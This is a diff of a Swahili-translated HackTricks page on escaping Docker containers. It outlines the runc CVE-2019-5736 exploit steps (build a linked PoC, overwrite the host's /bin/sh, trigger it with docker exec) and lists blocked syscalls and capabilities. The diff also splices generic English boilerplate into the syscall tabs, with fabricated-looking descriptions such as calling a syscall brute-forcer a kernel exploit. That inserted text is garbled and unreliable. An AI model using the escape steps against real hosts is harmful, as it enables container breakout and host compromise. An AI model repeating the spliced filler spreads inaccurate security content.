+Mbinu ya pili iliyoelezwa katika chapisho [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) inaonyesha jinsi unaweza kutumia bind mounts na user namespaces, kuathiri faili ndani ya mwenyeji (katika kesi hiyo maalum, kufuta faili).
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mchakato unaotumia zana za jamii za **juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii za **juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -497,14 +493,14 @@ Pata Ufikiaji Leo:
 
 ### Runc exploit (CVE-2019-5736)
 
-Ikiwa unaweza kutekeleza `docker exec` kama root (labda na sudo), jaribu kuongeza mamlaka kwa kutoroka kutoka kwa chombo kwa kutumia CVE-2019-5736 (exploit [hapa](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Mbinu hii kimsingi itaandika upya faili ya _**/bin/sh**_ ya **mwenyeji** **kutoka kwa chombo**, kwa hivyo yeyote anayetekeleza docker exec anaweza kuzindua mzigo.
+Kwa hali unaweza kutekeleza `docker exec` kama root (labda kwa sudo), jaribu kuongeza mamlaka kwa kutoroka kutoka kwa chombo kwa kutumia CVE-2019-5736 (exploit [hapa](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Mbinu hii kimsingi ita **badilisha** _**/bin/sh**_ binary ya **mwenyeji** **kutoka kwa chombo**, hivyo yeyote anayetekeleza docker exec anaweza kuzindua payload.
 
-Badilisha mzigo kulingana na hilo na jenga main.go na `go build main.go`. Faili ya binary iliyopatikana inapaswa kuwekwa kwenye chombo cha docker kwa utekelezaji.\
-Baada ya utekelezaji, mara tu inapoonyesha `[+] Overwritten /bin/sh successfully` unahitaji kutekeleza yafuatayo kutoka kwenye mashine ya mwenyeji:
+Badilisha payload kulingana na hilo na jenga main.go na `go build main.go`. Binary inayopatikana inapaswa kuwekwa kwenye chombo cha docker kwa utekelezaji.\
+Baada ya utekelezaji, mara tu inapoonyesha `[+] Imebadilishwa /bin/sh kwa mafanikio` unahitaji kutekeleza yafuatayo kutoka kwa mashine ya mwenyeji:
 
 `docker exec -it <container-name> /bin/sh`
 
-Hii itazindua mzigo ambao upo kwenye faili ya main.go.
+Hii itazindua payload ambayo ipo kwenye faili ya main.go.
 
 Kwa habari zaidi: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
@@ -512,14 +508,14 @@ Kwa habari zaidi: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-fro
 Kuna CVEs nyingine ambazo chombo kinaweza kuwa hatarini, unaweza kupata orodha katika [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
-## Kutoroka kwa Kubinafsisha Kubinafsisha
+## Kutoroka Kwa Kubinafsisha Kwa Docker
 
-### Kutoroka kwa Kubinafsisha Kubinafsisha
+### Eneo la Kutoroka la Docker
 
-* **Nafasi za majina:** Mchakato lazima uwe **umejitenga kabisa na michakato mingine** kupitia nafasi za majina, kwa hivyo hatuwezi kutoroka kwa kuingiliana na michakato mingine kutokana na nafasi za majina (kwa chaguo-msingi hawezi kuwasiliana kupitia IPCs, soketi za unix, huduma za mtandao, D-Bus, `/proc` ya michakato mingine).
-* **Mtumiaji wa mizizi**: Kwa chaguo-msingi, mtumiaji anayetekeleza mchakato ni mtumiaji wa mizizi (hata hivyo, mamlaka yake ni mdogo).
+* **Namespaces:** Mchakato unapaswa kuwa **kabisa tofauti na michakato mingine** kupitia namespaces, hivyo hatuwezi kutoroka kuingiliana na michakato mingine kutokana na namespaces (kwa chaguo-msingi hawezi kuwasiliana kupitia IPCs, soketi za unix, huduma za mtandao, D-Bus, `/proc` ya michakato mingine).
+* **Mtumiaji wa Root**: Kwa chaguo-msingi mtumiaji anayetekeleza mchakato ni mtumiaji wa root (hata hivyo mamlaka yake ni mdogo).
 * **Uwezo**: Docker inaacha uwezo ufuatao: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscalls**: Hizi ni syscalls ambazo **mtumiaji wa mizizi hataweza kuita** (kwa sababu ya kukosa uwezo + Seccomp). Syscalls zingine zinaweza kutumika kujaribu kutoroka.
+* **Syscalls**: Hizi ni syscalls ambazo **mtumiaji wa root hataweza kuita** (kwa sababu ya kukosa uwezo + Seccomp). Syscalls nyingine zinaweza kutumika kujaribu kutoroka.
 
 {% tabs %}
 {% tab title="x64 syscalls" %}
@@ -545,7 +541,43 @@ Kuna CVEs nyingine ambazo chombo kinaweza kuwa hatarini, unaweza kupata orodha k
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %}
+{% tab title="arm64 syscalls" %} 
+
+### Docker Breakout Privilege Escalation
+
+#### Description
+
+This repository contains a collection of scripts and techniques related to Docker breakout privilege escalation. These techniques can be used by attackers to escalate privileges from a Docker container to the host machine.
+
+#### Usage
+
+1. Clone the repository:
+
+   ```bash
+   git clone https://github.com/linux-hardening/privilege-escalation.git
+   ```
+
+2. Navigate to the Docker security directory:
+
+   ```bash
+   cd linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
+   ```
+
+3. Explore the scripts and techniques available in the repository to understand how Docker breakout privilege escalation works.
+
+#### Disclaimer
+
+This repository is for educational purposes only. The techniques demonstrated here should only be used in authorized penetration testing engagements or for educational purposes.
+
+#### Credits
+
+The scripts and techniques in this repository are inspired by various sources in the cybersecurity community. Special thanks to all the researchers and contributors who have shared their knowledge and insights.
+
+#### License
+
+This repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+{% endtab %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -563,7 +595,37 @@ Kuna CVEs nyingine ambazo chombo kinaweza kuwa hatarini, unaweza kupata orodha k
 0x111 -- finit_module
 0x118 -- bpf
 ```
-{% tab title="syscall_bf.c" %}
+{% endtab %}
+
+{% tab title="syscall_bf.c" %} 
+
+### Docker Breakout Privilege Escalation
+
+#### Description
+
+This technique demonstrates how an attacker can escape from a Docker container to the host by exploiting a vulnerability in the Linux kernel. By using a specially crafted C program that makes syscalls directly, the attacker can escalate privileges and gain access to the host system.
+
+#### Usage
+
+Compile the `syscall_bf.c` program on the host system using the provided Makefile. Run the compiled program inside a Docker container to trigger the privilege escalation and break out of the container.
+
+#### Detection
+
+Monitor for any unusual processes running inside Docker containers, especially those making direct syscalls. Regularly update the Linux kernel and Docker to patch any known vulnerabilities that could be exploited for privilege escalation.
+
+#### Prevention
+
+Implement least privilege principles by restricting the capabilities of Docker containers. Use seccomp profiles to limit the syscalls that can be made by processes inside the container. Regularly audit and monitor Docker containers for any suspicious activity that could indicate a privilege escalation attempt.
+
+#### References
+
+- [Docker Security](https://docs.docker.com/engine/security/)
+- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [Seccomp Profiles](https://docs.docker.com/engine/security/seccomp/)
+
+#### Disclaimer
+
+This technique is for educational purposes only. Do not use it for illegal activities.
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -627,7 +689,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
@@ -643,7 +705,7 @@ Other ways to support HackTricks:
 * If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
